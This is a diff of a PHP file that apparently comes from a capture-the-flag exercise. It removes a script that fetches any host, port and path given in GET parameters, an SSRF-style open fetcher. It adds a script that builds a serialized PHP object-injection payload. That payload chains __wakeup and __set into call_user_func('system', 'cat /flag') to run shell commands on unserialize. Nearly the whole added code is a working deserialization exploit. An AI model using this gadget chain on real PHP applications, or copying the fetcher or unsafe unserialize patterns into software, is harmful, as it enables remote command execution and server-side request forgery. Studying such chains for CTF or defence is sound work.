@@ -1,23 +1,26 @@
-/<?php
-function GetFile($host,$port,$link) {
-    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);
-    if(!$fp) {
-        echo "$errstr (error number $errno} \n";
-    }
-    else{
-        $out = "GET $link HTTP/1.1\r\n";
-        $out .= "Host: $host\r\n";
-        $out .= "Connection:Close\r\n\r\n";
-        $out .= "\r\n";
-        fwrite($fp, $out);
-        echo($out);
-        $contents='';
-        while(!feof($fp)) {
-            $contents .=fgets($fp, 1024);
-        }
-        fclose($fp);
-        return $contents;
+<?php
+class A{
+    var $a;
+    var $c;
+    public function __wakeup()
+    {
+        $this->a->c=$this->c;
     }
 }
-echo GetFile($_GET["host"], $_GET["port"], $_GET["link"]);
-?>
+class B{
+    var  $b;
+    public function __set($k,$v){
+        call_user_func($this->b,$v);
+    }
+}
+
+$a=new A();
+
+$b=new B();
+
+$a->a=$b;
+$a->c="cat /flag";
+$b->b="system";
+echo serialize($a);
+
+
